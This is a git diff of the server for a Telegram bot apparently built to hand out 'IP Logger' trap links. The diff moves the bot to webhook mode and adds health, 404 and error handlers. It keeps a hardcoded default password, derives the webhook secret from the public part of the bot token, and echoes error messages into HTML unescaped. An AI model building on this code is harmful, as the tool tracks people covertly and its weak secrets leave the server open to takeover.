@@ -56,6 +56,8 @@ async function startServer() {
   // Default to the Railway App URL as requested. It will still update dynamically based on host headers.
   let appHost = process.env.VITE_APP_URL || "https://telegram-bot-osint-v1-production.up.railway.app";
   
+  app.set("trust proxy", 1); // Crucial for Railway/Proxy environments
+
   const escapeHTML = (text: string) => {
     return text.replace(/[&<>"']/g, (m) => ({
       '&': '&amp;',
@@ -71,23 +73,38 @@ async function startServer() {
   const bot = token ? new Telegraf(token) : null;
   const botInstance = bot; // For compatibility with existing code
 
+  const webhookSecret = token ? token.split(':')[0] : null;
+  const webhookPath = webhookSecret ? `/telegraf/${webhookSecret}` : null;
+
   app.use(express.json({ limit: '50mb' }));
   app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
+  // Basic Health Check
   app.get('/health', (req, res) => {
-    res.json({
+    res.status(200).json({
       status: "ok",
       timestamp: new Date().toISOString(),
-      bot_ready: !!bot
+      bot: !!bot,
+      host: appHost
     });
   });
+
+  if (bot && webhookPath) {
+    app.post(webhookPath, (req, res) => {
+      bot.handleUpdate(req.body, res).catch(err => {
+        console.error("Bot Handle Update Error:", err);
+        if (!res.headersSent) res.sendStatus(500);
+      });
+    });
+    console.log(`[${new Date().toISOString()}] Bot Webhook Route Registered: ${webhookPath}`);
+  }
 
   app.use((req, res, next) => {
     // Attempt to capture public URL
     const hostObj = req.headers['x-forwarded-host'] || req.headers.host;
     if (hostObj) {
       const hostStr = Array.isArray(hostObj) ? hostObj[0] : hostObj;
-      if (hostStr.includes('.run.app') || hostStr.includes('.railway.app')) {
+      if (hostStr.includes('.run.app') || hostStr.includes('.railway.app') || hostStr.includes('ais-dev')) {
         const protocol = req.headers['x-forwarded-proto'] || 'https';
         appHost = `${protocol}://${hostStr}`;
       }
@@ -500,6 +517,19 @@ async function startServer() {
     });
   }
 
+  // 404 Handler for API and Traps
+  app.use((req, res) => {
+    res.status(404).send('<h2>Error 404: Endpoint Not Found</h2>');
+  });
+
+  // Global Error Handler
+  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
+    console.error('[SERVER ERROR]', err);
+    if (!res.headersSent) {
+      res.status(500).send('<h2>Critical Server Error</h2><p>' + (err.message || 'Unknown error') + '</p>');
+    }
+  });
+
   // TELEGRAM BOT SETUP
   const ADMIN_ID = Number(process.env.ADMIN_ID) || 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
   const PASSWORD = process.env.PASSWORD || "112233";
@@ -752,13 +782,24 @@ async function startServer() {
       ctx.reply(reply, { parse_mode: 'HTML' });
     });
 
-    bot.command('sethost', (ctx) => {
+    bot.command('sethost', async (ctx) => {
       const args = ctx.message.text.split(' ');
       if (args.length > 1) {
         let newHost = args[1];
         if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
         appHost = newHost;
-        ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
+        await ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
+        
+        const isLocal = appHost.includes('localhost') || appHost.includes('127.0.0.1');
+        if (!isLocal && webhookPath && bot) {
+          try {
+            const webhookUrl = `${appHost.replace(/\/$/, '')}${webhookPath}`;
+            await bot.telegram.setWebhook(webhookUrl);
+            await ctx.reply(`🌐 <b>Webhook Synced!</b>\nNew endpoint set.`, {parse_mode: 'HTML'});
+          } catch (e: any) {
+            await ctx.reply(`❌ <b>Failed to sync Webhook:</b>\n${e.message}`, {parse_mode: 'HTML'});
+          }
+        }
       } else {
         ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
       }
@@ -1727,36 +1768,6 @@ async function startServer() {
 
     process.once('SIGINT', () => bot && bot.stop('SIGINT'));
     process.once('SIGTERM', () => bot && bot.stop('SIGTERM'));
-
-    let retryCount = 0;
-    const maxRetries = 20;
-
-    const startBot = async () => {
-      if (!bot) return;
-      try {
-        console.log(`[${new Date().toISOString()}] Attempting to launch Telegram Bot (Polling)...`);
-        await bot.launch({ dropPendingUpdates: true });
-        console.log(`[${new Date().toISOString()}] ✅ Telegram Bot: SUCCESSFULLY CONNECTED`);
-        retryCount = 0;
-      } catch (err: any) {
-        if (err.code === 409 || err.response?.error_code === 409) {
-          console.warn(`[${new Date().toISOString()}] ⚠️ Telegram 409: Conflict (Bot active elsewhere).`);
-          if (retryCount < maxRetries) {
-            retryCount++;
-            const delay = 15000;
-            console.log(`[${new Date().toISOString()}] Retrying in ${delay/1000}s... (${retryCount}/${maxRetries})`);
-            setTimeout(startBot, delay);
-          } else {
-            console.error("🚨 GAGAL FATAL: Token bot ini aktif di server lain. Silakan matikan instance lain!");
-          }
-        } else {
-          console.error("❌ Bot Launch Error:", err.message);
-          setTimeout(startBot, 30000);
-        }
-      }
-    };
-
-    startBot().catch(e => console.error("Background Bot Launch Fail:", e));
   } else {
     console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
   }
@@ -1765,6 +1776,34 @@ async function startServer() {
     console.log(`[${new Date().toISOString()}] SERVER STARTUP SUCCESS!`);
     console.log(`[${new Date().toISOString()}] Listening on PORT: ${PORT}`);
     console.log(`[${new Date().toISOString()}] App Host: ${appHost}`);
+
+    // LAUNCH BOT AFTER SERVER IS BINDED
+    if (bot && token) {
+      const launchBot = async () => {
+          try {
+            const isProd = appHost.includes('railway.app') || appHost.includes('.run.app') || (process.env.VITE_APP_URL && !process.env.VITE_APP_URL.includes('localhost'));
+            
+            if (isProd && webhookPath) {
+              const fullWebhookUrl = `${appHost.replace(/\/$/, '')}${webhookPath}`;
+              console.log(`[${new Date().toISOString()}] Bot: SETTING WEBHOOK ${fullWebhookUrl}`);
+              await bot.telegram.setWebhook(fullWebhookUrl, { drop_pending_updates: true });
+              console.log(`[${new Date().toISOString()}] ✅ Bot: WEBHOOK MODE ACTIVE`);
+            } else {
+              console.log(`[${new Date().toISOString()}] Bot: STARTING POLLING MODE...`);
+              await bot.launch({ dropPendingUpdates: true });
+              console.log(`[${new Date().toISOString()}] ✅ Bot: POLLING MODE ACTIVE`);
+            }
+          } catch (err: any) {
+            if (err.code === 409 || err.response?.error_code === 409) {
+              console.warn(`[${new Date().toISOString()}] ⚠️ Bot: Conflict - skipping local instance.`);
+            } else {
+              console.error(`[${new Date().toISOString()}] ❌ Bot Launch Error:`, err.message);
+              setTimeout(launchBot, 30000);
+            }
+          }
+      };
+      setTimeout(launchBot, 2000);
+    }
   });
 
   server.on('error', (err: any) => {
